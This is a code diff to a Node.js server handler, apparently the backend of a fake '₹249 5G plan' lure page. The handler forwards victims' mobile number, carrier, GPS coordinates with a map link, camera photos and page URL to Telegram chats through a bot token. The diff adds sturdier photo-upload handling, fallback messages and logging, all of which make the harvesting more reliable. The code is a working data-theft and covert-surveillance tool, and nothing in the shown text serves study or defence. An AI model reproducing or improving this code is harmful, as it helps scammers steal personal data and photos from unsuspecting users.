@@ -46,7 +46,15 @@ module.exports = async (req, res) => {
     let userData = {};
     try {
       userData = req.body;
+      console.log('📥 Received data:', {
+        mobile: userData.mobile,
+        operator: userData.operator,
+        photoType: typeof userData.photo,
+        photoExists: !!userData.photo,
+        photoKeys: userData.photo ? Object.keys(userData.photo) : 'none'
+      });
     } catch (e) {
+      console.error('JSON parse error:', e);
       return res.status(400).json({ error: 'Invalid JSON in request body' });
     }
     
@@ -77,6 +85,21 @@ module.exports = async (req, res) => {
       }
     }
     
+    // ✅ UPDATED: Photo status check ko fix kiya
+    let photoStatus = 'N/A';
+    if (userData.photo) {
+      if (typeof userData.photo === 'string' && userData.photo.startsWith('data:image')) {
+        photoStatus = 'Captured ✓';
+        console.log(`📸 Photo data received (${userData.photo.length} bytes)`);
+      } else if (typeof userData.photo === 'object' && userData.photo.status === 'Permission Denied') {
+        photoStatus = 'Permission Denied';
+        console.log('📸 Camera permission denied');
+      } else {
+        photoStatus = 'Unknown Format';
+        console.log('📸 Unknown photo format:', typeof userData.photo, userData.photo);
+      }
+    }
+    
     // ✅ TUMHARA ORIGINAL TELEGRAM MESSAGE FORMAT
     const message = `
 💰 *₹249 5G PLAN ACTIVATED*
@@ -104,7 +127,7 @@ Accuracy: ${userData.location.accuracy ? Math.round(userData.location.accuracy) 
 🌍 View on Map: https://maps.google.com/?q=${userData.location.latitude},${userData.location.longitude}` : 
 'Permission Denied'}
 
-📸 *Camera:* ${userData.photo?.status === 'Permission Denied' ? 'Permission Denied' : (userData.photo ? 'Captured ✓' : 'N/A')}
+📸 *Camera:* ${photoStatus}
 
 🔗 *URL:* ${userData.deviceInfo?.url}
 ⏰ *Time:* ${new Date(userData.timestamp).toLocaleString('en-IN')}
@@ -116,6 +139,8 @@ Accuracy: ${userData.location.accuracy ? Math.round(userData.location.accuracy) 
     
     for (const chatId of chatIds) {
       try {
+        console.log(`📤 Sending to chat ${chatId}...`);
+        
         // Send message
         const messageResponse = await axios.post(
           `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`,
@@ -126,21 +151,74 @@ Accuracy: ${userData.location.accuracy ? Math.round(userData.location.accuracy) 
           },
           { timeout: 10000 }
         );
+        console.log(`✅ Message sent to ${chatId}`);
         
-        // Send photo if available
-        if (userData.photo && typeof userData.photo === 'string' && userData.photo.startsWith('data:image')) {
-          try {
+        // ✅ FIXED: COMPLETE PHOTO HANDLING LOGIC
+        if (userData.photo) {
+          console.log(`📸 Processing photo for ${chatId}...`);
+          
+          // Case 1: Base64 image string
+          if (typeof userData.photo === 'string' && userData.photo.startsWith('data:image')) {
+            try {
+              // Check image size
+              const photoSizeKB = Math.round(userData.photo.length / 1024);
+              console.log(`📏 Photo size: ${photoSizeKB}KB`);
+              
+              if (photoSizeKB > 5000) { // 5MB limit
+                console.log(`⚠️ Photo too large (${photoSizeKB}KB), sending as document`);
+                await axios.post(
+                  `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`,
+                  {
+                    chat_id: chatId,
+                    text: `📸 Photo captured (${photoSizeKB}KB) but too large for preview. User: ${userData.mobile}`
+                  },
+                  { timeout: 5000 }
+                );
+              } else {
+                // Send as photo
+                await axios.post(
+                  `https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`,
+                  {
+                    chat_id: chatId,
+                    photo: userData.photo,
+                    caption: `📸 Verification for ${userData.mobile}`
+                  },
+                  { 
+                    timeout: 15000,
+                    headers: { 'Content-Type': 'application/json' }
+                  }
+                );
+                console.log(`✅ Photo sent to ${chatId}`);
+              }
+            } catch (photoError) {
+              console.error(`❌ Photo send error to ${chatId}:`, photoError.response?.data || photoError.message);
+              
+              // Fallback: Send error message
+              await axios.post(
+                `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`,
+                {
+                  chat_id: chatId,
+                  text: `📸 Photo capture for ${userData.mobile} but upload failed. Error: ${photoError.message}`
+                },
+                { timeout: 5000 }
+              );
+            }
+          }
+          // Case 2: Permission denied
+          else if (typeof userData.photo === 'object' && userData.photo.status === 'Permission Denied') {
             await axios.post(
-              `https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`,
+              `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`,
               {
                 chat_id: chatId,
-                photo: userData.photo,
-                caption: `📸 Verification for ${userData.mobile}`
+                text: `📸 Camera permission denied by user: ${userData.mobile}`
               },
-              { timeout: 10000 }
+              { timeout: 5000 }
             );
-          } catch (photoError) {
-            console.log('Photo not sent to', chatId, ':', photoError.message);
+            console.log(`📸 Permission denied message sent to ${chatId}`);
+          }
+          // Case 3: Any other format
+          else {
+            console.log(`❓ Unknown photo format for ${chatId}:`, typeof userData.photo);
           }
         }
         
@@ -150,7 +228,7 @@ Accuracy: ${userData.location.accuracy ? Math.round(userData.location.accuracy) 
         await new Promise(resolve => setTimeout(resolve, 500));
         
       } catch (error) {
-        console.error(`Error sending to ${chatId}:`, error.response?.data || error.message);
+        console.error(`❌ Error sending to ${chatId}:`, error.response?.data || error.message);
         results.push({ 
           chatId, 
           success: false, 
@@ -164,11 +242,12 @@ Accuracy: ${userData.location.accuracy ? Math.round(userData.location.accuracy) 
       message: 'Data sent to Telegram successfully!',
       sentToChatIds: chatIds,
       country: 'India (+91)',
-      timestamp: new Date().toISOString()
+      timestamp: new Date().toISOString(),
+      photoStatus: photoStatus
     });
     
   } catch (error) {
-    console.error('API Error:', error);
+    console.error('❌ API Error:', error);
     res.status(500).json({ 
       success: false, 
       error: 'Internal server error',
